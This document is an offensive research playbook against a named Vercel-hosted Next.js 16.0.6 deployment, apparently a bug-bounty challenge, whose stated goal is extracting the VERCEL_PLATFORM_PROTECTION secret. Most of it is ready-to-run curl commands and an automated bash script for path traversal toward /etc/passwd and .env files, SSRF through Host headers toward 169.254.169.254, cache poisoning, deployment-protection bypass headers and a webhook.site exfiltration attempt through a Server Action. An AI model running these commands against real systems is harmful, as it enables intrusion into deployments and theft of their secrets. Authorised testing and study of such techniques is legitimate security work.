# Alternative Attack Vectors for Next.js 16.0.6 and Vercel Deployments
## Research Document - Non-RCE Based Exploitation

**Target**: https://nextjs-cve-hackerone.vercel.app/
**Next.js Version**: 16.0.6
**React Version**: 19.2.1
**Node Version**: v24.11.0
**Webhook**: https://webhook.site/f794cbb8-6c39-49cc-987a-a141d67c244a
**Goal**: Extract `VERCEL_PLATFORM_PROTECTION` environment variable

---

## 1. OTHER NEXT.JS CVEs IN 16.0.6

### CVE-2025-55183 (Medium Severity - Source Code Exposure)
**Status**: APPLICABLE - Next.js 16.0.6 is affected
**Affected Versions**: Next.js 13.x through 16.x (patched in 16.0.10+)
**Disclosure**: December 11, 2025

**Description**: Source code exposure vulnerability in React Server Components

**Exploitation Strategy**:
```bash
# Test for source code exposure through RSC responses
curl -H "Accept: text/x-component" \
     -H "Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D" \
     https://nextjs-cve-hackerone.vercel.app/
```

### CVE-2025-55184 (High Severity - Denial of Service)
**Status**: APPLICABLE - Next.js 16.0.6 is affected
**Affected Versions**: React 19.0.0 through 19.2.1, Next.js 13.x through 16.x (patched in 16.0.10+)
**Disclosure**: December 11, 2025

**Description**: Specially crafted HTTP request can cause infinite loop in RSC deserialization

**Note**: CVE-2025-55184 had an incomplete fix, complete fix issued as CVE-2025-67779

**Exploitation Strategy**:
This is a DoS attack and won't help extract environment variables, but could be used to test security response.

---

## 2. SSRF IN SERVER ACTIONS

### CVE-2024-34351 (SSRF - Full Read)
**Status**: PATCHED in Next.js 14.1.1+ (but worth testing)
**Affected Versions**: Next.js 13.4 to < 14.1.1
**CVSS**: 7.4 (High)

**Description**: SSRF vulnerability when Server Actions perform redirects to relative paths starting with '/'

**Requirements**:
1. Self-hosted Next.js (Vercel deployments may have additional protections)
2. Server Action performing redirect to relative path starting with '/'
3. Attacker controls Host header

**Exploitation Steps**:

```bash
# Step 1: Identify Server Actions
# We already know: sayHello action with ID 007138e0bfbdd7fe024391a1251fd5861f0b5145dc

# Step 2: Test Host header manipulation
curl -X POST https://nextjs-cve-hackerone.vercel.app/ \
  -H "Host: attacker-controlled-domain.com" \
  -H "Next-Action: 007138e0bfbdd7fe024391a1251fd5861f0b5145dc" \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary" \
  --data-binary @- << 'EOF'
------WebKitFormBoundary
Content-Disposition: form-data; name="0"

[]
------WebKitFormBoundary--
EOF

# Step 3: Try to access Vercel metadata (if SSRF works)
# Target: Vercel's internal metadata service (similar to AWS IMDS)
curl -X POST https://nextjs-cve-hackerone.vercel.app/ \
  -H "Host: 169.254.169.254" \
  -H "Next-Action: 007138e0bfbdd7fe024391a1251fd5861f0b5145dc" \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary" \
  --data-binary @- << 'EOF'
------WebKitFormBoundary
Content-Disposition: form-data; name="0"

[]
------WebKitFormBoundary--
EOF
```

### CVE-2025-57822 (Middleware SSRF)
**Status**: PATCHED in Next.js 14.2.32+ and 15.4.7+
**Affected Versions**: Next.js 14.x < 14.2.32, 15.x < 15.4.7

**Description**: Vulnerability in Next.js Middleware when request headers are directly passed into NextResponse.next()

**Note**: Target is running 16.0.6, so this is likely patched, but worth testing middleware endpoints.

---

## 3. INFORMATION DISCLOSURE

### Test for Debug Mode Exposure

```bash
# Check if Next.js is running in debug/development mode
curl -I https://nextjs-cve-hackerone.vercel.app/

# Look for headers indicating debug mode:
# - x-nextjs-matched-path
# - x-nextjs-page
# - x-vercel-id (deployment ID)
# - x-vercel-cache (cache status)

# Test common debug endpoints
curl https://nextjs-cve-hackerone.vercel.app/_next/static/development/_devPagesManifest.json
curl https://nextjs-cve-hackerone.vercel.app/_next/static/development/_buildManifest.js
curl https://nextjs-cve-hackerone.vercel.app/_next/static/development/_ssgManifest.js
```

### Build Manifest Analysis

```bash
# Access build manifest (may contain route information)
curl https://nextjs-cve-hackerone.vercel.app/_next/static/bIW_p-jXOXL69_fsJ2_vY/_buildManifest.js

# Access middleware manifest
curl https://nextjs-cve-hackerone.vercel.app/_next/static/bIW_p-jXOXL69_fsJ2_vY/_middlewareManifest.js

# Access app build manifest
curl https://nextjs-cve-hackerone.vercel.app/_next/static/bIW_p-jXOXL69_fsJ2_vY/_app-build-manifest.json
```

### Server Component Manifest

```bash
# Try to access server component manifest
curl https://nextjs-cve-hackerone.vercel.app/_next/static/bIW_p-jXOXL69_fsJ2_vY/_rsc/server-reference-manifest.json

# Try alternative paths
curl https://nextjs-cve-hackerone.vercel.app/_next/server/server-reference-manifest.json
curl https://nextjs-cve-hackerone.vercel.app/_next/server/app-paths-manifest.json
```

---

## 4. SOURCE MAPS

### Source Map Enumeration

**Security Risk**: Source maps can expose:
- Hardcoded secrets, API keys, tokens
- Internal endpoints and API routes
- Authentication logic vulnerabilities
- Proprietary algorithms
- Database credentials

**Real-World Examples**:
- GETTR: Exposed entire codebase via source maps, revealing undocumented API endpoint allowing password changes without auth
- Stripe API key leak: Hardcoded secret keys found in reconstructed JavaScript

**Exploitation Steps**:

```bash
# Check if production source maps are enabled
curl -I https://nextjs-cve-hackerone.vercel.app/_next/static/chunks/main.js
# Look for "sourceMappingURL" in response

# Try to access common source map files
curl https://nextjs-cve-hackerone.vercel.app/_next/static/chunks/main.js.map
curl https://nextjs-cve-hackerone.vercel.app/_next/static/chunks/webpack.js.map
curl https://nextjs-cve-hackerone.vercel.app/_next/static/chunks/framework.js.map
curl https://nextjs-cve-hackerone.vercel.app/_next/static/chunks/pages/_app.js.map
curl https://nextjs-cve-hackerone.vercel.app/_next/static/chunks/app/page.js.map

# Try with build ID
BUILD_ID="bIW_p-jXOXL69_fsJ2_vY"
curl https://nextjs-cve-hackerone.vercel.app/_next/static/$BUILD_ID/_buildManifest.js.map
curl https://nextjs-cve-hackerone.vercel.app/_next/static/$BUILD_ID/_ssgManifest.js.map

# Search for source maps using Google dork
# site:nextjs-cve-hackerone.vercel.app filetype:map

# If source map is found, extract and search for secrets
# grep -i "api_key\|secret\|password\|token\|VERCEL" extracted_source.js
```

**Configuration Check**:
```bash
# Next.js disables source maps by default in production
# BUT Vercel may have enabled them for debugging
# Check next.config.js (if accessible):
# productionBrowserSourceMaps: true (VULNERABLE)
```

---

## 5. VERCEL API/METADATA

### Vercel System Environment Variables

**Available Metadata** (if accessible):
- `VERCEL_URL` - deployment URL
- `VERCEL_ENV` - environment type
- `VERCEL_REGION` - deployment region
- `VERCEL_DEPLOYMENT_ID` - unique deployment ID
- `VERCEL_PROJECT_ID` - project identifier
- `VERCEL_GIT_COMMIT_SHA` - Git commit hash
- `VERCEL_PLATFORM_PROTECTION` - **TARGET VARIABLE**

**Exploitation Strategies**:

#### Strategy A: Access Through Unprotected API Route

```bash
# Test for API routes that might expose environment variables
curl https://nextjs-cve-hackerone.vercel.app/api/env
curl https://nextjs-cve-hackerone.vercel.app/api/config
curl https://nextjs-cve-hackerone.vercel.app/api/health
curl https://nextjs-cve-hackerone.vercel.app/api/debug
curl https://nextjs-cve-hackerone.vercel.app/api/status

# Try common Next.js API route patterns
curl https://nextjs-cve-hackerone.vercel.app/api/hello
curl https://nextjs-cve-hackerone.vercel.app/api/test
curl https://nextjs-cve-hackerone.vercel.app/api/info

# Test with Accept headers
curl -H "Accept: application/json" https://nextjs-cve-hackerone.vercel.app/api/env
```

#### Strategy B: Server Action Response Leakage

```bash
# Check if environment variables leak in error responses
# Send malformed Server Action request to trigger detailed error
curl -X POST https://nextjs-cve-hackerone.vercel.app/ \
  -H "Next-Action: 007138e0bfbdd7fe024391a1251fd5861f0b5145dc" \
  -H "Content-Type: application/json" \
  --data '{"invalid":"payload"}'

# Check error response for env var leakage in stack traces
```

#### Strategy C: Client-Side Exposure

```bash
# Check if NEXT_PUBLIC_* prefixed variables are exposed
curl https://nextjs-cve-hackerone.vercel.app/ | grep -i "NEXT_PUBLIC_"
curl https://nextjs-cve-hackerone.vercel.app/ | grep -i "VERCEL"

# Check inline scripts for window.__ENV__ or similar
curl https://nextjs-cve-hackerone.vercel.app/ | grep -i "__ENV__\|process.env"
```

#### Strategy D: Metadata Service (if SSRF exists)

```bash
# Attempt to access Vercel's internal metadata service
# (Requires SSRF vulnerability)
# Similar to AWS IMDS: http://169.254.169.254/

# Try various internal endpoints (speculative)
curl http://169.254.169.254/vercel/metadata
curl http://localhost:9229/env  # Node.js inspector port
curl http://localhost:3000/__env  # Custom env endpoint
```

---

## 6. BUILD ARTIFACTS

### Vercel Special Paths - Critical Discovery!

**CRITICAL**: Vercel has special pathnames that can expose source code and build logs:
- `/_src` - Source code access
- `/_logs` - Build logs access

**Default Protection**: These paths are protected by default and require authentication
**Risk**: If "Logs and Source Protection" is disabled in Project Settings, these become publicly accessible!

**Exploitation Steps**:

```bash
# Test if source code is publicly accessible
curl https://nextjs-cve-hackerone.vercel.app/_src
curl https://nextjs-cve-hackerone.vercel.app/_src/

# Test if build logs are publicly accessible
curl https://nextjs-cve-hackerone.vercel.app/_logs
curl https://nextjs-cve-hackerone.vercel.app/_logs/

# Try with authentication bypass attempts
curl -H "X-Vercel-Protection-Bypass: disabled" https://nextjs-cve-hackerone.vercel.app/_src
curl -H "Authorization: Bearer " https://nextjs-cve-hackerone.vercel.app/_logs

# Try with different HTTP methods
curl -X OPTIONS https://nextjs-cve-hackerone.vercel.app/_src
curl -X HEAD https://nextjs-cve-hackerone.vercel.app/_logs

# If accessible, build logs may contain:
# - Environment variable values printed during build
# - Installation logs showing package versions
# - Build errors that leak sensitive paths
# - Deployment configurations
```

### Build Artifacts Enumeration

```bash
# Try to access build output files
curl https://nextjs-cve-hackerone.vercel.app/.next/cache/
curl https://nextjs-cve-hackerone.vercel.app/.next/server/
curl https://nextjs-cve-hackerone.vercel.app/.vercel/

# Try common CI/CD artifact paths
curl https://nextjs-cve-hackerone.vercel.app/.vercel/output/
curl https://nextjs-cve-hackerone.vercel.app/build/
curl https://nextjs-cve-hackerone.vercel.app/dist/
```

---

## 7. NEXT.JS DEBUG ENDPOINTS

### Development Mode Endpoints

```bash
# Check for webpack HMR endpoint
curl https://nextjs-cve-hackerone.vercel.app/_next/webpack-hmr

# Check for development error overlay
curl https://nextjs-cve-hackerone.vercel.app/_next/static/development/_devMiddleware.js

# Try to access development tools
curl https://nextjs-cve-hackerone.vercel.app/__nextjs_original-stack-frame
curl https://nextjs-cve-hackerone.vercel.app/__nextjs_launch-editor

# Check for React DevTools backend
curl https://nextjs-cve-hackerone.vercel.app/_next/static/development/_devPagesManifest.json
```

### Node.js Inspector Endpoint

```bash
# If Node.js inspector is exposed (EXTREMELY UNLIKELY in production)
curl http://localhost:9229/json
curl http://localhost:9229/json/list

# Try through SSRF if available
# Inspector allows full debugging access and code execution
```

### Error Handling Endpoints

```bash
# Trigger errors to see if debug info is exposed
curl https://nextjs-cve-hackerone.vercel.app/_error
curl https://nextjs-cve-hackerone.vercel.app/404
curl https://nextjs-cve-hackerone.vercel.app/500

# Send malformed requests to trigger error pages
curl -H "Content-Type: text/html" -X POST https://nextjs-cve-hackerone.vercel.app/
```

---

## 8. GRAPHQL/API ROUTES

### API Route Discovery

```bash
# Enumerate common API routes
API_ROUTES=(
  "/api/env"
  "/api/config"
  "/api/graphql"
  "/api/debug"
  "/api/health"
  "/api/status"
  "/api/version"
  "/api/info"
  "/api/server-action"
  "/api/trpc"
  "/api/webhook"
)

for route in "${API_ROUTES[@]}"; do
  echo "Testing: $route"
  curl -s -o /dev/null -w "%{http_code}" https://nextjs-cve-hackerone.vercel.app$route
done
```

### GraphQL Introspection

```bash
# If GraphQL endpoint exists, try introspection
curl -X POST https://nextjs-cve-hackerone.vercel.app/api/graphql \
  -H "Content-Type: application/json" \
  --data '{"query":"{ __schema { types { name } } }"}'

# Try to query for environment configuration
curl -X POST https://nextjs-cve-hackerone.vercel.app/api/graphql \
  -H "Content-Type: application/json" \
  --data '{"query":"{ config { env } }"}'
```

### tRPC Routes (if using tRPC)

```bash
# Test for tRPC endpoints
curl https://nextjs-cve-hackerone.vercel.app/api/trpc/env
curl https://nextjs-cve-hackerone.vercel.app/api/trpc/config.get
```

---

## 9. PATH TRAVERSAL

### CVE-2020-5284 (Next.js < 9.3.2)
**Status**: PATCHED (but worth testing)
**Affected Versions**: Next.js < 9.3.2

**Description**: Directory traversal to access files in .next directory

**Exploitation Attempts**:

```bash
# Try classic path traversal in _next routes
curl https://nextjs-cve-hackerone.vercel.app/_next/../../../etc/passwd
curl https://nextjs-cve-hackerone.vercel.app/_next/../../.env
curl https://nextjs-cve-hackerone.vercel.app/_next/../../.env.local
curl https://nextjs-cve-hackerone.vercel.app/_next/../../.env.production

# Try URL encoded versions
curl https://nextjs-cve-hackerone.vercel.app/_next/%2e%2e/%2e%2e/%2e%2e/etc/passwd
curl https://nextjs-cve-hackerone.vercel.app/_next/%2e%2e/%2e%2e/.env

# Try with static routes
curl https://nextjs-cve-hackerone.vercel.app/static/../../../.env
curl https://nextjs-cve-hackerone.vercel.app/static/../../.env.local

# Try to access Next.js config files
curl https://nextjs-cve-hackerone.vercel.app/_next/../next.config.js
curl https://nextjs-cve-hackerone.vercel.app/_next/../package.json
curl https://nextjs-cve-hackerone.vercel.app/_next/../vercel.json

# Try null byte injection (patched but worth testing)
curl https://nextjs-cve-hackerone.vercel.app/_next/..%00/../../.env
```

### Server Action Path Traversal

```bash
# Try path traversal in Server Action context
# Create payload that attempts to read files

BOUNDARY="----WebKitFormBoundary$(openssl rand -hex 8)"
curl -X POST https://nextjs-cve-hackerone.vercel.app/ \
  -H "Next-Action: 007138e0bfbdd7fe024391a1251fd5861f0b5145dc" \
  -H "Content-Type: multipart/form-data; boundary=$BOUNDARY" \
  --data-binary @- << EOF
--$BOUNDARY
Content-Disposition: form-data; name="file"

../../.env
--$BOUNDARY--
EOF
```

---

## 10. CACHE POISONING

### CVE-2025-49005 (Cache Poisoning - RSC Payload)
**Status**: PATCHED in Next.js 15.3.3+
**Affected Versions**: Next.js >= 15.3.0 < 15.3.3
**CVSS**: 7.5 (High)

**Description**: Omission of Vary header allows RSC payloads to be cached and served instead of HTML

**Impact**:
- Cache can be poisoned with RSC payload (JSON/base64 data)
- Subsequent visitors see corrupted response
- May leak sensitive data in RSC payload

**Requirements**:
- CDN or reverse proxy caching responses
- Middleware and redirects in use

**Exploitation Strategy**:

```bash
# Step 1: Send request with RSC Accept header to poison cache
curl -X GET https://nextjs-cve-hackerone.vercel.app/ \
  -H "Accept: text/x-component" \
  -H "Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D" \
  -H "Next-Router-Prefetch: 1" \
  -H "RSC: 1"

# Step 2: Send normal request to check if cache was poisoned
curl -X GET https://nextjs-cve-hackerone.vercel.app/ \
  -H "Accept: text/html"

# Look for RSC payload in response (starts with "1:")
# Example poisoned response: 1:{"id":"007138e0bfbdd7fe024391a1251fd5861f0b5145dc","chunks":[...]}

# Step 3: If cache poisoning works, RSC payload may contain:
# - Server component props
# - Environment variable references
# - Internal state data
```

### Cache Key Manipulation

```bash
# Try to manipulate cache keys using different headers
curl https://nextjs-cve-hackerone.vercel.app/ \
  -H "X-Forwarded-Host: attacker.com" \
  -H "X-Forwarded-Proto: https"

# Try to bypass cache and get fresh response
curl https://nextjs-cve-hackerone.vercel.app/ \
  -H "Cache-Control: no-cache" \
  -H "Pragma: no-cache"

# Add custom Vary header values
curl https://nextjs-cve-hackerone.vercel.app/ \
  -H "RSC: 1" \
  -H "Next-Router-State-Tree: malicious"
```

### Web Cache Deception

```bash
# Try to trick cache into storing sensitive responses
curl https://nextjs-cve-hackerone.vercel.app/api/env?.css
curl https://nextjs-cve-hackerone.vercel.app/api/config?.js
curl https://nextjs-cve-hackerone.vercel.app/_logs?.png

# Path parameter pollution
curl https://nextjs-cve-hackerone.vercel.app/;/api/env
curl https://nextjs-cve-hackerone.vercel.app/%2fapi%2fenv
```

---

## ADDITIONAL ATTACK VECTORS

### 11. Deployment Protection Bypass

**Vercel Deployment Protection**: May be enabled to prevent unauthorized access

**Bypass Methods**:

```bash
# Test if deployment protection is enabled
curl -I https://nextjs-cve-hackerone.vercel.app/

# Try known bypass headers
curl -H "x-vercel-protection-bypass: <secret>" https://nextjs-cve-hackerone.vercel.app/
curl -H "x-vercel-skip-protection: true" https://nextjs-cve-hackerone.vercel.app/

# Try with different user agents
curl -H "User-Agent: vercel-deployment-checker" https://nextjs-cve-hackerone.vercel.app/
```

### 12. Server Component Prop Injection

```bash
# Try to inject props into Server Components via URL
curl "https://nextjs-cve-hackerone.vercel.app/?__props=%7B%22env%22%3A%22%24VERCEL_PLATFORM_PROTECTION%22%7D"

# Try RSC refresh with custom props
curl -X POST https://nextjs-cve-hackerone.vercel.app/ \
  -H "Next-Action: 007138e0bfbdd7fe024391a1251fd5861f0b5145dc" \
  -H "Accept: text/x-component" \
  --data '{"props":{"env":"VERCEL_PLATFORM_PROTECTION"}}'
```

### 13. Webhook Exfiltration Via Server Actions

**Even without RCE**, if we can control Server Action parameters, we might be able to:

```bash
# Try to make Server Action perform HTTP request to webhook
BOUNDARY="----WebKitFormBoundary$(openssl rand -hex 8)"
curl -X POST https://nextjs-cve-hackerone.vercel.app/ \
  -H "Next-Action: 007138e0bfbdd7fe024391a1251fd5861f0b5145dc" \
  -H "Content-Type: multipart/form-data; boundary=$BOUNDARY" \
  --data-binary @- << EOF
--$BOUNDARY
Content-Disposition: form-data; name="0"

["https://webhook.site/f794cbb8-6c39-49cc-987a-a141d67c244a"]
--$BOUNDARY--
EOF

# If Server Action has redirect or fetch functionality
# it might make outbound request we can intercept
```

### 14. Environment Variable Inference

```bash
# Check response headers for clues
curl -I https://nextjs-cve-hackerone.vercel.app/ | grep -i "x-vercel"

# Common Vercel headers that might leak info:
# - x-vercel-id: deployment ID
# - x-vercel-cache: cache status
# - x-vercel-execution-region: region
# - server: Vercel

# Check timing attacks for env var presence
time curl https://nextjs-cve-hackerone.vercel.app/
```

### 15. robots.txt and sitemap.xml

```bash
# Check for exposed paths in robots.txt
curl https://nextjs-cve-hackerone.vercel.app/robots.txt

# Check sitemap for hidden routes
curl https://nextjs-cve-hackerone.vercel.app/sitemap.xml
curl https://nextjs-cve-hackerone.vercel.app/sitemap.txt
```

---

## EXPLOITATION PRIORITY

### HIGH PRIORITY (Most Likely to Succeed)

1. **Vercel Special Paths** (`/_src`, `/_logs`)
   - If unprotected, directly exposes source and logs
   - Build logs may contain env vars printed during build
   - **Test first**

2. **Source Maps**
   - Real-world history of exposing secrets
   - Next.js 16.0.6 may have source maps enabled
   - **Test second**

3. **CVE-2025-55183** (Source Code Exposure)
   - Known to affect Next.js 16.0.6
   - May leak server-side code with embedded secrets
   - **Test third**

4. **API Route Enumeration**
   - Custom API routes may expose env vars
   - Common misconfiguration
   - **Test fourth**

5. **Cache Poisoning** (CVE-2025-49005)
   - May cause RSC payload to leak in cached responses
   - RSC payloads can contain sensitive data
   - **Test fifth**

### MEDIUM PRIORITY

6. SSRF (CVE-2024-34351, CVE-2025-57822)
7. Path Traversal attempts
8. Build Manifest analysis
9. GraphQL introspection
10. Deployment Protection bypass

### LOW PRIORITY (Likely Patched)

11. Debug mode endpoints
12. Path traversal (CVE-2020-5284)
13. Node.js inspector access

---

## AUTOMATED TESTING SCRIPT

Save as `test_all_vectors.sh`:

```bash
#!/bin/bash

TARGET="https://nextjs-cve-hackerone.vercel.app"
WEBHOOK="https://webhook.site/f794cbb8-6c39-49cc-987a-a141d67c244a"
BUILD_ID="bIW_p-jXOXL69_fsJ2_vY"

echo "========================================="
echo "Next.js 16.0.6 Alternative Attack Vectors"
echo "========================================="

# 1. CRITICAL: Test Vercel special paths
echo "[*] Testing /_src and /_logs access..."
curl -s https://nextjs-cve-hackerone.vercel.app/_src | head -20
curl -s https://nextjs-cve-hackerone.vercel.app/_logs | head -20

# 2. Test source maps
echo "[*] Testing source map access..."
curl -s https://nextjs-cve-hackerone.vercel.app/_next/static/chunks/main.js.map | head -10
curl -s https://nextjs-cve-hackerone.vercel.app/_next/static/chunks/webpack.js.map | head -10

# 3. CVE-2025-55183: Source code exposure
echo "[*] Testing CVE-2025-55183 (Source Code Exposure)..."
curl -s -H "Accept: text/x-component" \
     -H "Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D" \
     https://nextjs-cve-hackerone.vercel.app/ | head -50

# 4. API route enumeration
echo "[*] Testing common API routes..."
for route in /api/env /api/config /api/debug /api/health /api/status; do
  echo "  Testing: $route"
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" $TARGET$route)
  echo "    Status: $STATUS"
  if [ "$STATUS" = "200" ]; then
    curl -s $TARGET$route
  fi
done

# 5. Cache poisoning test
echo "[*] Testing cache poisoning (CVE-2025-49005)..."
curl -s -H "Accept: text/x-component" \
     -H "RSC: 1" \
     -H "Next-Router-Prefetch: 1" \
     https://nextjs-cve-hackerone.vercel.app/ | head -50

# 6. Build artifacts
echo "[*] Testing build artifacts..."
curl -s $TARGET/_next/static/$BUILD_ID/_buildManifest.js | head -20
curl -s $TARGET/_next/static/$BUILD_ID/_middlewareManifest.js | head -20

# 7. Path traversal attempts
echo "[*] Testing path traversal..."
curl -s $TARGET/_next/../../.env | head -10
curl -s $TARGET/_next/../../.env.local | head -10
curl -s $TARGET/_next/../../.env.production | head -10

# 8. Check response headers for leaked info
echo "[*] Checking response headers..."
curl -I $TARGET | grep -i "x-vercel\|server\|x-next"

echo "[*] Testing complete!"
```

---

## RECONNAISSANCE CHECKLIST

- [ ] Test `/_src` access
- [ ] Test `/_logs` access
- [ ] Enumerate all source map files
- [ ] Test CVE-2025-55183 (source exposure)
- [ ] Test CVE-2025-49005 (cache poisoning)
- [ ] Enumerate API routes
- [ ] Test SSRF in Server Actions
- [ ] Analyze build manifests
- [ ] Test path traversal
- [ ] Check robots.txt / sitemap
- [ ] Test GraphQL introspection (if endpoint exists)
- [ ] Analyze response headers
- [ ] Test deployment protection bypass
- [ ] Check for debug mode indicators

---

## REFERENCES

### CVE Information
- [Next.js CVE-2025-66478 Advisory](https://nextjs.org/blog/CVE-2025-66478)
- [Vercel Security Bulletin: CVE-2025-55184 and CVE-2025-55183](https://vercel.com/kb/bulletin/security-bulletin-cve-2025-55184-and-cve-2025-55183)
- [Unit42: Exploitation of Critical Vulnerability in React Server Components](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- [GitHub Discussion: Next.js CVE-2025-66478](https://github.com/vercel/next.js/discussions/86939)

### SSRF Vulnerabilities
- [Assetnote: Next.js SSRF (CVE-2024-34351)](https://www.assetnote.io/resources/research/advisory-next-js-ssrf-cve-2024-34351)
- [Intigriti: Hacking Next.js Targets - Advanced SSRF Exploitation](https://www.intigriti.com/researchers/blog/hacking-tools/ssrf-vulnerabilities-in-nextjs-targets)
- [GitHub Advisory: Server-Side Request Forgery in Server Actions](https://github.com/vercel/next.js/security/advisories/GHSA-fr5h-rqp8-mj6g)
- [GitHub Advisory: Next.js Improper Middleware Redirect Handling (CVE-2025-57822)](https://github.com/advisories/GHSA-4342-x723-ch2f)

### Source Maps Security
- [Sentry: Abusing Exposed Sourcemaps](https://blog.sentry.security/abusing-exposed-sourcemaps/)
- [Buka.sh: The Hidden Danger of Turbopack Sourcemaps](https://knowledge.buka.sh/your-source-code-is-in-production-the-hidden-danger-of-turbopack-sourcemaps/)
- [CyberSierra: Are You Leaking Secrets Through React Source Maps?](https://cybersierra.co/blog/secure-react-source-maps/)
- [Acunetix: Javascript Source map detected](https://www.acunetix.com/vulnerabilities/web/javascript-source-map-detected/)

### Vercel Security
- [Vercel: System Environment Variables](https://vercel.com/docs/environment-variables/system-environment-variables)
- [Vercel: Security Settings](https://vercel.com/docs/projects/project-configuration/security-settings)
- [HackTricks Cloud: Vercel Security](https://cloud.hacktricks.wiki/en/pentesting-ci-cd/vercel-security.html)

### Path Traversal
- [Snyk: Path Traversal in next (CVE-2020-5284)](https://security.snyk.io/vuln/SNYK-JS-NEXT-561584)
- [Acunetix: Arbitrary File Read in Next.js](https://www.acunetix.com/vulnerabilities/web/arbitrary-file-read-in-next-js/)

### Cache Poisoning
- [zhero: Next.js and cache poisoning](https://zhero-web-sec.github.io/research-and-things/nextjs-and-cache-poisoning-a-quest-for-the-black-hole)
- [GitHub Advisory: Cache poisoning due to omission of Vary header](https://github.com/vercel/next.js/security/advisories/GHSA-r2fc-ccr8-96c4)
- [Miggo: CVE-2025-49005 - Next.js App Router Cache Poison](https://www.miggo.io/vulnerability-database/cve/CVE-2025-49005)
- [Volerion: CVE-2025-49005 Cache-poisoning in Next.js App Router](https://blog.volerion.com/posts/CVE-2025-49005/)

---

## NOTES

This research focuses on **information disclosure and data exfiltration** techniques that do not require code execution, since runtime mitigation blocks all RCE attempts on the target.

The most promising vectors are:
1. Vercel's `/_src` and `/_logs` paths (if unprotected)
2. Exposed source maps with hardcoded secrets
3. CVE-2025-55183 source code exposure
4. Misconfigured API routes
5. Cache poisoning leading to RSC payload leakage

All techniques should be tested systematically, starting with the highest priority vectors.
